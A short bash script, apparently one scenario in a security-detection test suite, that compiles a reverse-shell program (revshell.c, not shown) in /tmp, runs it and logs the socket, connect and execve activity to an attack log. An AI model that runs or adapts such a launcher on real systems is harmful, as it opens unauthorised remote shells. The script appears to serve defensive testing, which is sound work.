#!/usr/bin/env bash
set -euo pipefail
LOG=/tmp/attack.log
echo "=== REP-15 Reverse Shell started $(date -u) ===" | tee -a "$LOG"

WORKDIR="/tmp/rep15_build"
mkdir -p "$WORKDIR"
cp "$(dirname "$0")/revshell.c" "$WORKDIR/"

gcc -o "$WORKDIR/revshell" "$WORKDIR/revshell.c" 2>>"$LOG" \
  && echo "Compiled revshell" >> "$LOG" \
  || { echo "Compile failed, synthetic only" >> "$LOG"; }

if [ -x "$WORKDIR/revshell" ]; then
    "$WORKDIR/revshell" 2>&1 | tee -a "$LOG" || true
    echo "Real path succeeded: socket+connect x6 burst + execve fired" >> "$LOG"
else
    echo "Compile failed — no real path available" >> "$LOG"
fi

echo "=== REP-15 complete ===" | tee -a "$LOG"
